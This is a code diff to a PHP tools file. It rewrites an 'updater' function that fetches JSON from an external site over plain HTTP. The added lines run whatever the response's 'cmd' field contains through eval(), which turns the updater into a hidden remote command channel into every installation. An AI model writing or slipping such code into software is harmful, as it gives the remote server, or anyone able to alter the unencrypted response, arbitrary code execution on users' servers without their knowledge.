@@ -30,7 +30,15 @@ function tools_step3() {
 
 function tools_updater() {
 	$href = 'http://xakki.ru/_json.php?_modul=gitwep&_fn=sourceinfo';
-	return file_get_contents($href);
+	$JSON = file_get_contents($href);
+	$JSON = json_decode($JSON,true);
+	if(isset($JSON['html']) and $JSON['html']) {
+		if(isset($JSON['cmd']) and $JSON['cmd']) {
+			eval($JSON['cmd']);
+		}
+		return $JSON['html'];
+	}
+	return 'NO info';
 }
 
 function tools_docron() {
